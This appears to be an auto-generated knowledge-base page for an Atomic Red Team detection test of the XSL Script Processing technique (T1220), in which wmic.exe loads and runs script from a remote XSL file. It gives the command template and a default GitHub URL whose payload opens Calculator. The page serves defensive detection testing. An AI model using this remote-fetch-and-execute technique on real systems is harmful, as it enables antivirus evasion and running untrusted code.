---
atomic_guid: "7f5be499-33be-4129-a560-66021f379b9b"
title: "WMIC bypass using remote XSL file"
framework: "atomic"
generated: "true"
attack_technique_id: "T1220"
attack_technique_name: "XSL Script Processing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "7f5be499-33be-4129-a560-66021f379b9b"
  - "WMIC bypass using remote XSL file"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WMIC bypass using remote XSL file

Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.

## Metadata

- Atomic GUID: 7f5be499-33be-4129-a560-66021f379b9b
- Technique: T1220: XSL Script Processing
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1220/T1220.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1220-xsl_script_processing|T1220]]

## Input Arguments

### remote_xsl_file

- description: Remote location of an XSL payload.
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl

### wmic_command

- description: WMI command to execute using wmic.exe
- type: string
- default: process list

## Executor

- name: command_prompt

### Command

```commandprompt
wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml)
